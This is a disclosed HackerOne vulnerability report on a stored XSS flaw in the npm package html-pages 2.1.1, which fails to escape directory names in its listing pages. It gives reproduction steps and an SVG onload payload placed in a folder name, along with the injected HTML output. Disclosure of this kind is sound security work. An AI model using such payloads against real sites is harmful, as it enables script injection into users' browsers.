# [html-pages] Stored XSS in the filename when directories listing

## Report Details
- **Report ID**: 330356
- **URL**: https://hackerone.com/reports/330356
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-03-27T13:52:58.486Z
- **Disclosed**: 2018-06-12T08:04:51.222Z

## Reporter
- **Username**: tungpun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a Store XSS vulnerability in **html-pages**
It allows executing malicious javascript code in the user's browser.

# Module

**module name:** html-pages
**version:** 2.1.1
**npm page:** `https://www.npmjs.com/package/html-pages`

## Module Description

Simple development http server for file serving and directory listing made by a Designer. Use it for hacking your HTML/JavaScript/CSS files, but not for deploying your final site. 

# Vulnerability

## Steps To Reproduce:

* Install the module:
`$ npm install html-pages`

* On the working directory, create a new child directory with name: `"><svg onload=alert(5);>`

* Start the server:
`$ ./node_modules/html-pages/bin/index.js -p 6060`

* Go to `http://127.0.0.1:6060/`, then click on the directory `"><svg onload=alert(5);>`
or open `http://127.0.0.1:6060/%22%3E%3Csvg%20onload=alert(5);%3E/` directly, the XSS popup will fire:

{F279119}

## Vulnerability Description

This issue happens because of the lack of path sanitization.

HTML output:
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>Files within nodejs-example/"><svg onload=alert(5);></title>
    <meta name="description" content="">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/style.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/component.css">
    <link rel="stylesheet" href="/@html-pages-internal-files-hoihj6ey0qu/css/loader.css">
    <link rel="icon" type="image/svg+xml" href="/@html-pages-internal-files-hoihj6ey0qu/images/logo.svg">
  </head>

  <body>
    <header>
      <div class="wrapper">
        <nav>
          <ol class="breadcrumb custom-separator">
              <li class="">
                <a class="background-effect" href="/">nodejs-example</a>
              </li>
              <li class="current">
                <span>"><svg onload=alert(5);></span>
              </li>
          </ol>
        </nav>

[...]

```

## Supporting Material/References:

* macOS High Sierra 10.13.3
* node v8.10.0
* npm 5.6.0
* Firefox 59.0.2 (64-bit)

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows executing malicious javascript code in the user's browser

## Attachments
- hp.png
